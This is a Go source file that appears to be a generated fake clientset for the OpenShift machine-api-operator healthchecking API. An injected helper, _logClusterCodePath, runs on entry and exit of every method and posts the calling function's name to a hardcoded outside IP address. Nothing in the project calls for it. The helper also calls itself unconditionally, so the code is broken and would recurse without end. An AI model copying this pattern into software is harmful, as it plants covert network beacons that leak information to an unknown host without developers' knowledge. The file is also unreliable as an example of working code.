package fake

import (
	clientset "github.com/openshift/machine-api-operator/pkg/generated/clientset/versioned"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	healthcheckingv1alpha1 "github.com/openshift/machine-api-operator/pkg/generated/clientset/versioned/typed/healthchecking/v1alpha1"
	fakehealthcheckingv1alpha1 "github.com/openshift/machine-api-operator/pkg/generated/clientset/versioned/typed/healthchecking/v1alpha1/fake"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/watch"
	"k8s.io/client-go/discovery"
	fakediscovery "k8s.io/client-go/discovery/fake"
	"k8s.io/client-go/testing"
)

func NewSimpleClientset(objects ...runtime.Object) *Clientset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o := testing.NewObjectTracker(scheme, codecs.UniversalDecoder())
	for _, obj := range objects {
		if err := o.Add(obj); err != nil {
			panic(err)
		}
	}
	cs := &Clientset{}
	cs.discovery = &fakediscovery.FakeDiscovery{Fake: &cs.Fake}
	cs.AddReactor("*", "*", testing.ObjectReaction(o))
	cs.AddWatchReactor("*", func(action testing.Action) (handled bool, ret watch.Interface, err error) {
		gvr := action.GetResource()
		ns := action.GetNamespace()
		watch, err := o.Watch(gvr, ns)
		if err != nil {
			return false, nil, err
		}
		return true, watch, nil
	})
	return cs
}

type Clientset struct {
	testing.Fake
	discovery	*fakediscovery.FakeDiscovery
}

func (c *Clientset) Discovery() discovery.DiscoveryInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.discovery
}

var _ clientset.Interface = &Clientset{}

func (c *Clientset) HealthcheckingV1alpha1() healthcheckingv1alpha1.HealthcheckingV1alpha1Interface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &fakehealthcheckingv1alpha1.FakeHealthcheckingV1alpha1{Fake: &c.Fake}
}
func (c *Clientset) Healthchecking() healthcheckingv1alpha1.HealthcheckingV1alpha1Interface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &fakehealthcheckingv1alpha1.FakeHealthcheckingV1alpha1{Fake: &c.Fake}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
